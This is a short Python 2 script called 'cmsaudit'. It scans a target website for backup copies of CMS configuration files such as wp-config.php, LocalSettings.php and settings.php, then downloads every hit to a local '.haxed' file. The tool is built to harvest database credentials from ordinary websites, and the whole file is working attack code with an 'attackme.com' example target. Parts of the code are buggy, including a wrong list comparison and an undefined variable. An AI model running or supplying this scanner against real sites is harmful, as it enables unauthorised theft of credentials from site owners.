#!/usr/bin/python

import urllib2
import argparse
from threading import Semaphore, Thread

#Add here other known extension for the backup files
completion = ["","~",".save",".swp",".swo","#","-bak", "orig"]

#Add here other configuration files
cmsConfig = [
	"wp-config.php",
	"config.php",
	"configuration.php",
	"LocalSettings.php",
	"mt-config.cgi",
	"settings.php"
	]

threads = []
screenLock = Semaphore(value=1)

class Scan(object):
	
	def __init__(self,rootSite,proxyOnOff=False,proxyAddr=None):
		self.rootSite = rootSite
		self.proxyOnOff = proxyOnOff
		self.proxyAddr = proxyAddr
	
	def scan(self):
		for confFile in cmsConfig:
			for compl in completion:
				url = ""
				if not self.rootSite.startswith("http://"):
					self.rootSite = "http://" + self.rootSite
				
				if not self.rootSite.endswith("/"):
					self.rootSite = self.rootSite + "/"
				
				if completion == "#":
					url = rootsite + compl + confFile + compl
				else:
					url = self.rootSite + confFile + compl
				
				#print "[*] Probing: " + url	
				t = Thread(target=self._scan,args=(url,))
				t.setDaemon(True)
				t.start()
				threads.append(t)
				
	def _scan(self,url):
		try:
			proxy = None
			opener = None
			connection = None
			if self.proxyOnOff:
				proxy = urllib2.ProxyHandler({'http':self.proxyAddr})
				opener = urllib2.build_opener(proxy)
				urllib2.install_opener(opener)
				connection = opener.open(url)
			else:
				connection = urllib2.urlopen(url)
			if connection:
				screenLock.acquire()
				print "[+] Found " + url
				print "[+] Downloading " + url
				self._downloadFile(url,connection.readlines())
				
			connection.close()
		except Exception,e:
			pass
		finally:
			screenLock.release()

	def _downloadFile(self,url,lines):
		des = "-".join(url.split('//')[1].split('/'))
		name = "conf-" + des + ".haxed"
		f = open(name,"w")
		for l in lines:
			f.write(l)
		f.close()
def main():
	parser = argparse.ArgumentParser(prog="cmsaudit",description="Locate backup configuration files into a given root site")
	parser.add_argument("-t", help="root site eg: http://attackme.com, 192.168.1.4")
	parser.add_argument("--proxy", help="http proxy eg 127.0.0.1:8080")
	args = parser.parse_args()
	
	host = ""
	proxyOnOff = False
	proxyAddr = ''
	
	if not args.t:
		parser.print_help()
		exit(0)
	else:
		host = args.t
		
	if args.proxy:
		proxyOnOff = True
		proxyAddr = args.proxy
		
	s = Scan(host,proxyOnOff,proxyAddr)
	s.scan()
	
	try:
		for t in threads:
			t.join()
	except KeyboardInterrupt:
		print "Exiting..."
		exit(0)

if __name__ == "__main__":
	main()
